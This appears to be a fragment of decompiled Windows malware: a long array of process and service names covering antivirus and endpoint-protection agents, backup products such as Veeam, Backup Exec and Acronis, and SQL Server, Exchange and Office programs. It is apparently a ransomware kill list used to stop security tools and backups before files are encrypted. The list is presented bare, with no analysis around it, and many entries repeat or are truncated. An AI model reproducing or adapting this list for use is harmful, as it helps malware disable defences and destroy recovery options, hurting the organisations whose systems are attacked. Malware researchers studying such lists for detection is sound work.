  L"mydesktopqos.exe",
  L"nisoptui.exe",
  L"mydesktopservice.exe",
  L"nisserv.exe",
  L"mysqld.exe",
  L"nisum.exe",
  L"mysqld-nt.exe",
  L"nmain.exe",
  L"mysqld-opt.exe",
  L"npfmntor.exe",
  L"ocautoupds.exe",
  L"nprotect.exe",
  L"ocomm.exe",
  L"npscheck.exe",
  L"ocssd.exe",
  L"npssvc.exe",
  L"onenote.exe",
  L"nscsrvce.exe",
  L"outlook.exe",
  L"nsctop.exe",
  L"powerpnt.exe",
  L"nsmdtr.exe",
  L"sqbcoreservice.exe",
  L"olfsnt40.exe",
  L"sqlwriter.exe",
  L"opscan.exe",
  L"steam.exe",
  L"poproxy.exe",
  L"synctime.exe",
  L"pqibrowser.exe",
  L"tbirdconfig.exe",
  L"pqv2isvc.exe",
  L"thebat.exe",
  L"pxeservice.exe",
  L"thebat64.exe",
  L"qdcsfs.exe",
  L"thunderbird.exe",
  L"qserver.exe",
  L"visio.exe",
  L"reportersvc.exe",
  L"winword.exe",
  L"rnav.exe",
  L"wordpad.exe",
  L"savfmsesp.exe",
  L"xfssvccon.exe",
  L"savroam.exe",
  L"tmlisten.exe",
  L"savscan.exe",
  L"pccntmon.exe",
  L"savui.exe",
  L"cntaosmgr.exe",
  L"sbserv.exe",
  L"ntrtscan.exe",
  L"scanexplicit.exe",
  L"mbamtray.exe",
  L"semsvc.exe",
  L"qhactivedefense.exe",
  L"sesclu.exe",
  L"qhwatchdog.exe",
  L"sevinst.exe",
  L"qhsafetray.exe",
  L"smsectrl.exe",
  L"avgsvc.exe",
  L"smselog.exe",
  L"avgui.exe",
  L"smsesjm.exe",
  L"v3lite.exe",
  L"smsesp.exe",
  L"v3main.exe",
  L"smsesrv.exe",
  L"v3sp.exe",
  L"smsetask.exe",
  L"avastui.exe",
  L"smseui.exe",
  L"avastsvc.exe",
  L"sms.exe",
  L"avguard.exe",
  L"sndmon.exe",
  L"avshadow.exe",
  L"sndsrvc.exe",
  L"avgnt.exe",
  L"spbbcsvc.exe",
  L"avira.servicehost.exe",
  L"symlcsvc.exe",
  L"avira.systray.exe",
  L"symproxysvc.exe",
  L"bdagent.exe",
  L"symsport.exe",
  L"bdredline.exe",
  L"symtray.exe",
  L"bdss.exe",
  L"symwsc.exe",
  L"bullguardbhvscanner.exe",
  L"sysdoc32.exe",
  L"bullguardscanner.exe",
  L"ucservice.exe",
  L"bullguardtray.exe",
  L"updtnv28.exe",
  L"bullguardupdate.exe",
  L"urllstck.exe",
  L"bullguard.exe",
  L"usrprmpt.exe",
  L"cmdagent.exe",
  L"v2iconsole.exe",
  L"cistray.exe",
  L"vpc32.exe",
  L"cis.exe",
  L"vpdn_lu.exe",
  L"spideragent.exe",
  L"vprosvc.exe",
  L"dwengine.exe",
  L"wfxctl32.exe",
  L"dwarkdaemon.exe",
  L"wfxmod32.exe",
  L"dwnetfilter.exe",
  L"wfxsnt40.exe",
  L"a2service.exe",
  L"lucomserver.exe",
  L"a2guard.exe.a2start.exe",
  L"savfmselog.exe",
  L"egui.exe",
  L"savfmsesjm.exe",
  L"ekrn.exe",
  L"savfmsectrl.exe",
  L"fshoster32.exe",
  L"savfmsespamstatsmanager.exe",
  L"fshoster64.exe",
  L"savfmsesrv.exe",
  L"fortisslvpndaemon.exe",
  L"savfmsetask.exe",
  L"fortiesnac.exe",
  L"savfmseui.exe",
  L"fortiwf.exe",
  L"snac.exe",
  L"fortitray.exe",
  L"ssm.exe",
  L"fchelper64.exe",
  L"reportsvc.exe",
  L"fortiproxy.exe",
  L"vptray.exe",
  L"fcappdb.exe",
  L"procexp.exe",
  L"fcdblog.exe",
  L"tdimon.exe",
  L"avp.exe",
  L"tfun.exe",
  L"avpui.exe",
  L"tfgui.exe",
  L"mbamservice.exe",
  L"tfservice.exe",
  L"mcsacore.exe",
  L"tftray.exe",
  L"mcapexe.exe",
  L"tiaspn~1.exe",
  L"mcshield.exe",
  L"traflnsp.exe",
  L"mcsvhost.exe",
  L"asupport.exe",
  L"nortonsecurity.exe",
  L"isntsmtp.exe",
  L"psuaservice.exe",
  L"nsmdemf.exe",
  L"psuamain.exe",
  L"nsmdmon.exe",
  L"psanhost.exe",
  L"nsmdreal.exe",
  L"sdrservice.exe",
  L"nsmdsch.exe",
  L"swc_service.exe",
  L"ofcdog.exe",
  L"swi_service.exe",
  L"pccnt.exe",
  L"ssp.exe",
  L"pccntupd.exe",
  L"ccsvchst.exe",
  L"pcctlcom.exe",
  L"smcgui.exe",
  L"pcscnsrv.exe",
  L"coreserviceshell.exe",
  L"schupd.exe",
  L"coreframeworkhost.exe",
  L"tmntsrv.exe",
  L"uiwatchdog.exe",
  L"tmpfw.exe",
  L"uiseagnt.exe",
  L"tmproxy.exe",
  L"paamsrv.exe",
  L"tmas.exe",
  L"psh_svc.exe",
  L"entitymain.exe",
  L"aupdrun.exe",
  L"aphost.exe",
  L"acaas.exe",
  L"lwdmserver.exe",
  L"acaegmgr.exe",
  L"mrf.exe",
  L"acaif.exe",
  L"isntsysmonitor",
  L"acais.exe",
  L"ofcpfwsvc.exe",
  L"ahnsd.exe",
  L"dwwin.exe",
  L"ahnsdsv.exe",
  L"patch.exe",
  L"autoup.exe",
  L"pccclient.exe",
  L"v3clnsrv.exe",
  L"pccguide.exe",
  L"v3medic.exe",
  L"pcclient.exe",
  L"v3svc.exe",
  L"pccpfw.exe",
  L"aflogvw.exe",
  L"pcscan.exe",
  L"ahnrpt.exe",
  L"pntiomon.exe",
  L"atwsctsk.exe",
  L"pop3pack.exe",
  L"v3exec.exe",
  L"pop3trap.exe",
  L"v3imscn.exe",
  L"scanmailoutlook.exe",
  L"monsvcnt.exe",
  L"smoutlookpack.exe",
  L"monsysnt.exe",
  L"webtrapnt.exe",
  L"aexnsrcvsvc.exe",
  L"euqmonitor.exe",
  L"aexsvc.exe",
  L"smex_activeupda",
  L"atrshost.exe",
  L"smex_master.exe",
  L"ctdataload.exe",
  L"smex_remoteconf",
  L"aexagentuihost.exe",
  L"smex_systemwatc",
  L"aexnsagent.exe",
  L"svcgenerichost",
  L"aclntusr.exe",
  L"spntsvc.exe",
  L"aexswdusr.exe",
  L"stopp.exe",
  L"pxemtftp.exe",
  L"stwatchdog.exe",
  L"aclient.exe",
  L"usbguard.exe",
  L"securitycenter.exe",
  L"uploadrecord.exe",
  L"starta.exe",
  L"sbamsvc.exe",
  L"stopa.exe",
  L"vrvmail.exe",
  L"anvir.exe",
  L"vrvmon.exe",
  L"csrss_tc.exe",
  L"vrvnet.exe",
  L"ashavast.exe",
  L"vrv.exe",
  L"ashbug.exe",
  L"wrsa.exe",
  L"ashchest.exe",
  L"networkagent.exe",
  L"ashcmd.exe",
  L"websensecontrolservice.exe",
  L"ashdisp.exe",
  L"mpcmdrun.exe",
  L"ashenhcd.exe",
  L"msascui.exe",
  L"ashlogv.exe",
  L"msmpeng.exe",
  L"ashmaisv.exe",
  L"mspmspsv.exe",
  L"ashpopwz.exe",
  L"kb891711.exe",
  L"ashquick.exe",
  L"zavaux.exe",
  L"ashserv.exe",
  L"zavcore.exe",
  L"ashsimp2.exe",
  L"zillya.exe",
  L"ashsimpl.exe",
  L"zlclient.exe",
  L"ashskpcc.exe",
  L"vsmon.exe",
  L"ashskpck.exe",
  L"forcefield.exe",
  L"ashupd.exe",
  L"iswmgr.exe",
  L"ashwebsv.exe",
  L"zapro.exe",
  L"aswdisp.exe",
  L"zonealarm.exe",
  L"aswregsvr.exe",
  L"mantispm.exe",
  L"aswserv.exe",
  L"Acronis VSS Provider",
  L"aswupdsv.exe",
  L"Enterprise Client Service",
  L"aswwebsv.exe",
  L"Sophos Agent",
  L"avengine.exe",
  L"Sophos AutoUpdate Service",
  L"afwserv.exe",
  L"Sophos Clean Service",
  L"avastemupdate.exe",
  L"Sophos Device Control Service",
  L"unsecapp.exe",
  L"Sophos File Scanner Service",
  L"avgamsvr.exe",
  L"Sophos Health Service",
  L"avgas.exe",
  L"Sophos MCS Agent",
  L"avgcc32.exe",
  L"Sophos MCS Client",
  L"avgcc.exe",
  L"Sophos Message Router",
  L"avgctrl.exe",
  L"Sophos Safestore Service",
  L"avgdiag.exe",
  L"Sophos System Protection Service",
  L"avgemc.exe",
  L"Sophos Web Control Service",
  L"avgfws8.exe",
  L"SQLsafe Backup Service",
  L"avgfwsrv.exe",
  L"SQLsafe Filter Service",
  L"avginet.exe",
  L"Symantec System Recovery",
  L"avgmsvr.exe",
  L"Veeam Backup Catalog Data Service",
  L"avgrssvc.exe",
  L"AcronisAgent",
  L"avgscanx.exe",
  L"AcrSch2Svc",
  L"avgserv9.exe",
  L"Antivirus",
  L"avgserv.exe",
  L"ARSM",
  L"avgupd.exe",
  L"BackupExecAgentAccelerator",
  L"avgupdln.exe",
  L"BackupExecAgentBrowser",
  L"avgupsvc.exe",
  L"BackupExecDeviceMediaService",
  L"avgvv.exe",
  L"BackupExecJobEngine",
  L"avgwb.dat",
  L"BackupExecManagementService",
  L"avgw.exe",
  L"BackupExecRPCService",
  L"avgwizfw.exe",
  L"BackupExecVSSProvider",
  L"guard.exe",
  L"bedbg",
  L"avgcsrvx.exe",
  L"DCAgent",
  L"avgidsagent.exe",
  L"EPSecurityService",
  L"avgidsmonitor.exe",
  L"EPUpdateService",
  L"avgidsui.exe",
  L"EraserSvc11710",
  L"avgidswatcher.exe",
  L"EsgShKernel",
  L"avgam.exe",
  L"FA_Scheduler",
  L"avgnsx.exe",
  L"IISAdmin",
  L"avgfws9.exe",
  L"IMAP4Svc",
  L"avgrsx.exe",
  L"macmnsvc",
  L"avgtray.exe",
  L"masvc",
  L"avgwdsvc.exe",
  &off_41DA98,
  L"sidebar.exe",
  &off_41DAC8,
  L"avgchsvx.exe",
  L"McAfeeEngineService",
  L"avgcmgr.exe",
  L"McAfeeFramework",
  L"avgemcx.exe",
  L"McAfeeFrameworkMcAfeeFramework",
  L"avgfws.exe",
  L"McShield",
  L"avgmfapx.exe",
  L"McTaskManager",
  L"avgcefrend.exe",
  L"mfemms",
  L"avgcsrva.exe",
  L"mfevtp",
  L"avgemca.exe",
  L"MMS",
  L"avgnsa.exe",
  L"mozyprobackup",
  L"avgrsa.exe",
  L"MsDtsServer",
  L"loggingserver.exe",
  L"MsDtsServer100",
  L"toolbarupdater.exe",
  L"MsDtsServer110",
  L"wtusystemsuport.exe",
  L"MSExchangeES",
  L"avgregcl.exe",
  L"MSExchangeIS",
  L"avgsystx.exe",
  L"MSExchangeMGMT",
  L"vprot.exe",
  L"MSExchangeMTA",
  L"avcenter.exe",
  L"MSExchangeSA",
  L"avconfig.exe",
  L"MSExchangeSRS",
  L"avesvc.exe",
  L"MSOLAP$SQL_2008",
  L"avmailc.exe",
  L"MSOLAP$SYSTEM_BGC",
  L"avmcdlg.exe",
  L"MSOLAP$TPS",
  L"avnotify.exe",
  L"MSOLAP$TPSAMA",
  L"avscan.exe",
  L"MSSQL$BKUPEXEC",
  L"guardgui.exe",
  L"MSSQL$ECWDB2",
  L"avadmin.exe",
  L"MSSQL$PRACTICEMGT",
  L"avfwsvc.exe",
  L"MSSQL$PRACTTICEBGC",
  L"avwebgrd.exe",
  L"MSSQL$PROFXENGAGEMENT",
  L"fwinst.exe",
  L"MSSQL$SBSMONITORING",
  L"sysoptenginesvc.exe",
  L"MSSQL$SHAREPOINT",
  L"bavtray.exe",
  L"MSSQL$SQL_2008",
  L"bhipssvc.exe",
  L"MSSQL$SYSTEM_BGC",
  L"bmrt.exe",
  L"MSSQL$TPS",
  L"seccenter.exe",
  L"MSSQL$TPSAMA",
  L"gziface.exe",
  L"MSSQL$VEEAMSQL2008R2",
  L"gzserv.exe",
  L"MSSQL$VEEAMSQL2012",
  L"bdc.exe",
  L"MSSQLFDLauncher",
  L"bdlite.exe",
  L"MSSQLFDLauncher$PROFXENGAGEMENT",
  L"bdmcon.exe",
  L"MSSQLFDLauncher$SBSMONITORING",
  L"bdsubmit.exe",
  L"MSSQLFDLauncher$SHAREPOINT",
  L"deloeminfs.exe",
  L"MSSQLFDLauncher$SQL_2008",
  L"livesrv.exe",
  L"MSSQLFDLauncher$SYSTEM_BGC",
  L"setloadorder.exe",
  L"MSSQLFDLauncher$TPS",
  L"vsserv.exe",
  L"MSSQLFDLauncher$TPSAMA",
  L"xcommsvr.exe",
  L"MSSQLSERVER",
  L"bka.exe",
  L"MSSQLServerADHelper100",
  L"bkavsystemserver.exe",
  L"MSSQLServerOLAPService",
  L"blupro.exe",
  L"MySQL57",
  L"blackd.exe",
  L"ntrtscan",
  L"blackice.exe",
  L"OracleClientCache80",
  L"proutil.exe",
  L"PDVFSService",
  L"rapapp.exe",
  L"POP3Svc",
  L"basfipm.exe",
  L"ReportServer",
  L"isafe.exe",
  L"ReportServer$SQL_2008",
  L"cavrid.exe",
  L"ReportServer$SYSTEM_BGC",
  L"vetmsg.exe",
  L"ReportServer$TPS",
  L"amswmagt",
  L"ReportServer$TPSAMA",
  L"caf.exe",
  L"RESvc",
  L"capmuamagt.exe",
  L"sacsvr",
  L"ccnfagent.exe",
  L"SamSs",
  L"ccsmagtd.exe",
  L"SAVAdminService",
  L"cfftplugin.exe",
  L"SAVService",
  L"cfnotsrvd.exe",
  L"SDRSVC",
  L"cfsmsmd.exe",
  L"SepMasterService",
  L"alert.exe",
  L"ShMonitor",
  L"igateway.exe",
  L"Smcinst",
  L"inotask.exe",
  L"SmcService",
  L"caantispyware.exe",
  L"SMTPSvc",
  L"caavcmdscan.exe",
  L"SNAC",
  L"caav.exe",
  L"SntpService",
  L"caavguiscan.exe",
  L"sophossps",
  L"cafw.exe",
  L"SQLAgent$BKUPEXEC",
  L"calogdump.exe",
  L"SQLAgent$ECWDB2",
  L"capfaem.exe",
  L"SQLAgent$PRACTTICEBGC",
  L"capfsem.exe",
  L"SQLAgent$PRACTTICEMGT",
  L"cappactiveprotection.exe",
  L"SQLAgent$PROFXENGAGEMENT",
  L"casecuritycenter.exe",
  L"SQLAgent$SBSMONITORING",
  L"caunst.exe",
  L"SQLAgent$SHAREPOINT",
  L"cavrep.exe",
  L"SQLAgent$SQL_2008",
  L"cctray.exe",
  L"SQLAgent$SYSTEM_BGC",
  L"ccupdate.exe",
  L"SQLAgent$TPS",
  L"isafinst.exe",
  L"SQLAgent$TPSAMA",
  L"itmrt_supportdiagnostics.exe",
  L"SQLAgent$VEEAMSQL2008R2",
  L"itmrtsvc.exe",
  L"SQLAgent$VEEAMSQL2012",
  L"itmrt_trace.exe",
  L"SQLBrowser",
  L"ppclean.exe",
  L"SQLSafeOLRService",
  L"umxagent.exe",
  L"SQLSERVERAGENT",
  L"umxcfg.exe",
  L"SQLTELEMETRY",
  L"umxfwhlp.exe",
  L"SQLTELEMETRY$ECWDB2",
  L"umxpol.exe",
  L"SQLWriter",
  L"unvet32.exe",
  L"SstpSvc",
  L"capfasem.exe",
  L"svcGenericHost",
  L"ccprovsp.exe",
  L"swi_filter",
  L"ppctlpriv.exe",
  L"swi_service",
  L"casc.exe",
  L"swi_update_64",
  L"ccschedulersvc.exe",
  L"TmCCSF",
  L"ccsystemreport.exe",
  L"tmlisten",
  L"inonmsrv.exe",
  L"TrueKey",
  L"inoweb.exe",
  L"TrueKeyScheduler",
  L"auth8021x.exe",
  L"TrueKeyServiceHelper",
  L"krbcc32s.exe",
  L"UI0Detect",
  L"pep.exe",
  L"VeeamBackupSvc",
  L"realmon.exe",
  L"VeeamBrokerSvc",
  L"repmgr64.exe",
  L"VeeamCatalogSvc",
  L"csacontrol.exe",
  L"VeeamCloudSvc",
  L"leventmgr.exe",
  L"VeeamDeploymentService",
  L"okclient.exe",
  L"VeeamDeploySvc",
  L"clamscan.exe",
  L"VeeamEnterpriseManagerSvc",
  L"clamtray.exe",
  L"VeeamMountSvc",
  L"clamwin.exe",
  L"VeeamNFSSvc",
  L"ccemflsv.exe",
  L"VeeamRESTSvc",
  L"cssauth.exe",
  L"VeeamTransportSvc",
  L"cavscan.exe",
  L"W3Svc",
  L"clps.exe",
  L"wbengine",
  L"clpsla.exe",
  L"WRSVC",
  L"clpsls.exe",
  L"VeeamHvIntegrationSvc",
  L"cmdinstall.exe",
  L"swi_update",
  L"cfpconfig.exe",
  L"SQLAgent$CXDB",
  L"cfp.exe",
  L"SQLAgent$CITRIX_METAFRAME",
  L"cfplogvw.exe",
  L"SQL Backups",
  L"cfpsbmit.exe",
  L"MSSQL$PROD",
  L"cfpupdat.exe",
  L"Zoolz 2 Service",
  L"crashrep.exe",
  L"MSSQLServerADHelper",
  L"cpf.exe",
  L"SQLAgent$PROD",
  L"cfpconfg.exe",
  L"msftesql$PROD",
  L"csfalconservice.exe",
  L"NetMsmqActivator",
  L"cylanceui.exe",
  L"EhttpSrv",
  L"cylancesvc.exe",
  L"ekrn",
  L"cramtray.exe",
  L"ESHASRV",
  L"crssvc.exe",
  L"MSSQL$SOPHOS",
  L"amsvc.exe",
  L"SQLAgent$SOPHOS",
  L"frzstate2k.exe",
  L"AVP",
  L"drwagnui.exe",
  L"klnagent",
  L"drweb32.exe",
  L"MSSQL$SQLEXPRESS",
  L"drweb32w.exe",
  L"SQLAgent$SQLEXPRESS",
  L"drweb386.exe",
  L"kavfsslp",
  L"drwebcgp.exe",
  L"KAVFSGT",
  L"drwebdc.exe",
  L"KAVFS",
  L"drweb.exe",
  L"mfefire",
  L"drwebmng.exe",
  L"avast! Antivirus",
  L"drwebscd.exe",
  L"aswBcc",
  L"drwebupw.exe",
  L"Avast Business Console Client Antivirus Service",
  L"drwebwcl.exe",
  L"mfewc",
  L"drwebwin.exe",
  L"Telemetryserver",
  L"drwinst.exe",
  L"WdNisSvc",
  L"spiderml.exe",
  L"WinDefend",
  L"spidernt.exe",
  L"MCAFEETOMCATSRV530",
  L"spiderui.exe",
  L"MCAFEEEVENTPARSERSRV",
  L"drwagntd.exe",
  L"MSSQLFDLauncher$ITRIS",
  L"drwupgrade.exe",
  L"MSSQL$EPOSERVER",
  L"drwebcom.exe",
  L"MSSQL$ITRIS",
  L"eeyeevnt.exe",
  L"SQLAgent$EPOSERVER",
  L"retinaengine.exe",
  L"SQLAgent$ITRIS",
  L"a2guard.exe",
  L"SQLTELEMETRY$ITRIS",
  L"a2start.exe",
  L"MsDtsServer130",
  L"administrator.exe",
  L"SSISTELEMETRY130",
  L"control_panel.exe",
  L"MSSQLLaunchpad$ITRIS",
  L"usergate.exe",
  L"BITS",
  L"esmagent.exe",
  L"BrokerInfrastructure",
  L"era.exe",
  L"epag",
  L"ppmcativedetection.exe",
  L"EPIntegrationService",
  L"vettray.exe",
  L"EPProtectedService",
  L"cavtray.exe",
  L"epredline",
  L"inorpc.exe",
  L"TmPfw",
  L"inort.exe",
  L"SentinelAgent",
  L"ca.exe",
  L"SentinelHelperService",
  L"caissdt.exe",
  L"LogProcessorService",
  L"etagent.exe",
  L"SentinelStaticEngine",
  L"etloganalyzer.exe",
  &off_420134,
  L"etrssfeeds.exe",
  &off_42015C,
  L"evtarmgr.exe",
  &off_4201A4,
  L"evtmgr.exe",
  &off_4201E0,
  L"etreporter.exe",
  &off_420228,
  L"etconsole3.exe",
  &off_420274,
  L"etwcontrolpanel.exe",
  &off_4202B0,
  L"useranalysis.exe",
  &off_4202E0,
  L"etcorrel.exe",
  &off_420310,
  L"evtprocessecfile.exe",
  &off_420360,
  L"etscheduler.exe",
  L"MSSQL$CITRIX_METAFRAME",
  L"useractivity.exe",
  L"RumorServer",
  L"traptrackermgr.exe",
  L"myAgtSvc",
  L"ewidoctrl.exe",
  L"SentinelAgent",
  L"ewidoguard.exe",
  L"SentinelHelperService",
  L"nslocollectorservice.exe",
  L"LogProcessorService",
  L"fmon.exe",
  L"SentinelStaticEngine",
  L"fortifw.exe",
  L"TmPfw",
  L"update_task.exe",
  L"EPSecurityService",
  L"fpavserver.exe",
  L"EPUpdateService",
  L"fprottray.exe",
  L"epredline",
  L"fameh32.exe",
  L"EPProtectedService",
  L"fspex.exe",
  L"EPIntegrationService",
  L"fsaa.exe",
  L"epag",
  L"bwgo0000",
  L"BITS",
  L"fch32.exe",
  L"BrokerInfrastructure",
  L"fih32.exe",
  L"EPSecurityService",
  L"fsaua.exe",
  L"EPUpdateService",
  L"fsav32.exe",
  L"MSSQLLaunchpad$ITRIS",
  L"fscuif.exe",
  L"SSISTELEMETRY130",
  L"fsdfwd.exe",
  L"MsDtsServer130",
  L"fsgk32.exe",
  L"SQLTELEMETRY$ITRIS",
  L"fsgk32st.exe",
  L"SQLAgent$ITRIS",
  L"fsguidll.exe",
  L"SQLAgent$EPOSERVER",
  L"fsguiexe.exe",
  L"MSSQL$ITRIS",
  L"fshdll32.exe",
  L"MSSQL$EPOSERVER",
  L"fsm32.exe",
  L"MSSQLFDLauncher$ITRIS",
  L"fsma32.exe",
  L"MCAFEEEVENTPARSERSRV",
  L"fsmb32.exe",
  L"MCAFEETOMCATSRV530",
  L"fsorsp.exe",
  L"WdNisSvc",
  L"fspc.exe",
  L"WinDefend",
  L"fsqh.exe",
  L"Telemetryserver",
  L"fssm32.exe",
  L"mfewc",
  L"setupguimngr.exe",
  L"Avast Business Console Client Antivirus Service",
  L"tnbutil.exe",
  L"aswBcc",
  L"fsavgui.exe",
  L"avast! Antivirus",
  L"gdscan.exe",
  L"mfefire",
  L"avkproxy.exe",
  L"KAVFS",
  L"avkservice.exe",
  L"KAVFSGT",
  L"avktray.exe",
  L"kavfsslp",
  L"avkwctl.exe",
  L"wbengine",
  L"gdfirewalltray.exe",
  L"SQLAgent$SQLEXPRESS",
  L"gdfwsvc.exe",
  L"MSSQL$SQLEXPRESS",
  L"endpointsecurity.exe",
  L"klnagent",
  L"esecservice.exe",
  L"AVP",
  L"gfireporterservice.exe",
  L"SQLAgent$SOPHOS",
  L"esecagntservice.exe",
  L"MSSQL$SOPHOS",
  L"rcsvcmon.exe",
  L"EhttpSrv",
  L"dolphincharge.e",
  L"ekrn",
  L"dolphincharge.exe",
  L"ESHASRV",
  L"loggetor.exe",
  L"NetMsmqActivator",
  L"netalertclient.exe",
  L"msftesql$PROD",
  L"printdevice.exe",
  L"SQLAgent$PROD",
  L"pwdfilthelp.exe",
  L"MSSQLServerADHelper",
  L"pthosttr.exe",
  L"Zoolz 2 Service",
  L"hpqwmiex.exe",
  L"MSSQL$PROD",
  L"ntcaagent.exe",
  L"SQL Backups",
  L"ntcadaemon.exe",
  L"SQLAgent$CITRIX_METAFRAME",
  L"ntcaservice.exe",
  L"Acronis VSS Provider",
  L"privacyiconclient.exe",
  L"Enterprise Client Service",
  L"rapuisvc.exe",
  L"Sophos Agent",
  L"vpatch.exe",
  L"Sophos AutoUpdate Service",
  L"tclproc.exe",
  L"Sophos Clean Service",
  L"isscsf.exe",
  L"Sophos Device Control Service",
  L"issdaemon.exe",
  L"Sophos File Scanner Service",
  L"kvdetech.exe",
  L"Sophos Health Service",
  L"kvmonxp_2.kxp",
  L"Sophos MCS Agent",
  L"kvmonxp.kxp",
  L"Sophos MCS Client",
  L"kvolself.exe",
  L"Sophos Message Router",
  L"kvsrvxp_1.exe",
  L"Sophos Safestore Service",
  L"kvsrvxp.exe",
  L"Sophos System Protection Service",
  L"kvxp.kxp",
  L"Sophos Web Control Service",
  L"ppppwallrun.exe",
  L"SQLsafe Backup Service",
  L"avpcc.exe",
  L"SQLsafe Filter Service",
  L"avpexec.exe",
  L"Symantec System Recovery",
  L"avpm.exe",
  L"Veeam Backup Catalog Data Service",
  L"avpncc.exe",
  L"AcronisAgent",
  L"avps.exe",
  L"AcrSch2Svc",
  L"avpupd.exe",
  L"Antivirus",
  L"kav.exe",
  L"ARSM",
  L"kavisarv.exe",
  L"BackupExecAgentAccelerator",
  L"kavmm.exe",
  L"BackupExecAgentBrowser",
  L"kavss.exe",
  L"BackupExecDeviceMediaService",
  L"kavsvc.exe",
  L"BackupExecJobEngine",
  L"kis.exe",
  L"BackupExecManagementService",
  L"klnagent.exe",
  L"BackupExecRPCService",
  L"klswd.exe",
  L"BackupExecVSSProvider",
  L"klwtblfs.exe",
  L"bedbg",
  L"kwsprod.exe",
  L"DCAgent",
  L"up2date.exe",
  L"EPSecurityService",
  L"klserver.exe",
  L"EPUpdateService",
  L"oespamtest.exe",
  L"EraserSvc11710",
  L"kavadapterexe.exe",
  L"EsgShKernel",
  L"kavlotsingleton.exe",
  L"FA_Scheduler",
  L"kavfsgt.exe",
  L"IISAdmin",
  L"kavfsrcn.exe",
  L"IMAP4Svc",
  L"kavfs.exe",
  L"macmnsvc",
  L"kavfswp.exe",
  L"masvc",
  L"kavshell.exe",
  &off_41DA98,
  L"klnacserver.exe",
  &off_41DAC8,
  L"avpdtagt.exe",
  L"McAfeeEngineService",
  L"netcfg.exe",
  L"McAfeeFramework",
  L"kavfsscs.exe",
  L"McAfeeFrameworkMcAfeeFramework",
  L"kavtray.exe",
  L"McShield",
  L"persfw.exe",
  L"McTaskManager",
  L"avserver.exe",
  L"mfemms",
  L"winroute.exe",
  L"mfevtp",
  L"wrctrl.exe",
  L"MMS",
  L"kabackreport.exe",
  L"mozyprobackup",
  L"kaccore.exe",
  L"MsDtsServer",
  L"kanmcmain.exe",
  L"MsDtsServer100",
  L"kastray.exe",
  L"MsDtsServer110",
  L"kislive.exe",
  L"MSExchangeES",
  L"kmailmon.exe",
  L"MSExchangeIS",
  L"knupdatemain.exe",
  L"MSExchangeMGMT",
  L"kswebshield.exe",
  L"MSExchangeMTA",
  L"kxeserv.exe",
  L"MSExchangeSA",
  L"uplive.exe",
  L"MSExchangeSRS",
  L"kansgui.exe",
  L"MSOLAP$SQL_2008",
  L"kansvr.exe",
  L"MSOLAP$SYSTEM_BGC",
  L"kavstart.exe",
  L"MSOLAP$TPS",
  L"kpfwsvc.exe",
  L"MSOLAP$TPSAMA",
  L"kwatch.exe",
  L"MSSQL$BKUPEXEC",
  L"kav32.exe",
  L"MSSQL$ECWDB2",
  L"kissvc.exe",
  L"MSSQL$PRACTICEMGT",
  L"kpfw32.exe",
  L"MSSQL$PRACTTICEBGC",
  L"system.exe",
  L"MSSQL$PROFXENGAGEMENT",
  L"wssfcmai.exe",
  L"MSSQL$SBSMONITORING",
  L"aawservice.exe",
  L"MSSQL$SHAREPOINT",
  L"ad-aware2007.exe",
  L"MSSQL$SQL_2008",
  L"nlsvc.exe",
  L"MSSQL$SYSTEM_BGC",
  L"engineserver.exe",
  L"MSSQL$TPS",
  L"eventparser.exe",
  L"MSSQL$TPSAMA",
  L"log_qtine.exe",
  L"MSSQL$VEEAMSQL2008R2",
  L"mfeann.exe",
  L"MSSQL$VEEAMSQL2012",
  L"nailgpip.exe",
  L"MSSQLFDLauncher",
  L"rpcserv.exe",
  L"MSSQLFDLauncher$PROFXENGAGEMENT",
  L"srvmon.exe",
  L"MSSQLFDLauncher$SBSMONITORING",
  L"mcagent.exe",
  L"MSSQLFDLauncher$SHAREPOINT",
  L"mfemactl.exe",
  L"MSSQLFDLauncher$SQL_2008",
  L"macmnsvc.exe",
  L"MSSQLFDLauncher$SYSTEM_BGC",
  L"masvc.exe",
  L"MSSQLFDLauncher$TPS",
  L"masalert.exe",
  L"MSSQLFDLauncher$TPSAMA",
  L"msssrv.exe",
  L"MSSQLSERVER",
  L"massrv.exe",
  L"MSSQLServerADHelper100",
  L"msscli.exe",
  L"MSSQLServerOLAPService",
  L"mcshld9x.exe",
  L"MySQL57",
  L"mgavrtcl.exe",
  L"ntrtscan",
  L"mcappins.exe",
  L"OracleClientCache80",
  L"mfecanary.exe",
  L"PDVFSService",
  L"macompatsvc.exe",
  L"POP3Svc",
  L"mcvsrte.exe",
  L"ReportServer",
  L"mfefire.exe",
  L"ReportServer$SQL_2008",
  L"dao_log.exe",
  L"ReportServer$SYSTEM_BGC",
  L"firesvc.exe",
  L"ReportServer$TPS",
  L"firetray.exe",
  L"ReportServer$TPSAMA",
  L"mfeesp.exe",
  L"RESvc",
  L"naprdmgr.exe",
  L"sacsvr",
  L"cpd.exe",
  L"SamSs",
  L"mfefw.exe",
  L"SAVAdminService",
  L"frameworkservic",
  L"SAVService",
  L"cmgrdian.exe",
  L"SDRSVC",
  L"mcshell.exe",
  L"SepMasterService",
  L"mfehcs.exe",
  L"ShMonitor",
  L"mcinfo.exe",
  L"Smcinst",
  L"hwapi.exe",
  L"SmcService",
  L"mcafeedatabackup.exe",
  L"SMTPSvc",
  L"mcmscsvc.exe",
  L"SNAC",
  L"mcnasvc.exe",
  L"SntpService",
  L"mcods.exe",
  L"sophossps",
  L"mcpromgr.exe",
  L"SQLAgent$BKUPEXEC",
  L"mcproxy.exe",
  L"SQLAgent$ECWDB2",
  L"mcuimgr.exe",
  L"SQLAgent$PRACTTICEBGC",
  L"mpfsrv.exe",
  L"SQLAgent$PRACTTICEMGT",
  L"mpsevh.exe",
  L"SQLAgent$PROFXENGAGEMENT",
  L"mps.exe",
  L"SQLAgent$SBSMONITORING",
  L"msksrver.exe",
  L"SQLAgent$SHAREPOINT",
  L"redirsvc.exe",
  L"SQLAgent$SQL_2008",
  L"saservice.exe",
  L"SQLAgent$SYSTEM_BGC",
  L"siteadv.exe",
  L"SQLAgent$TPS",
  L"mfemms.exe",
  L"SQLAgent$TPSAMA",
  L"neotrace.exe",
  L"SQLAgent$VEEAMSQL2008R2",
  L"vshwin32.exe",
  L"SQLAgent$VEEAMSQL2012",
  L"mpfagent.exe",
  L"SQLBrowser",
  L"mpfconsole.exe",
  L"SQLSafeOLRService",
  L"mpf.exe",
  L"SQLSERVERAGENT",
  L"mpfservice.exe",
  L"SQLTELEMETRY",
  L"mpftray.exe",
  L"SQLTELEMETRY$ECWDB2",
  L"mscifapp.exe",
  L"SQLWriter",
  L"mfevtps.exe",
  L"SstpSvc",
  L"qclean.exe",
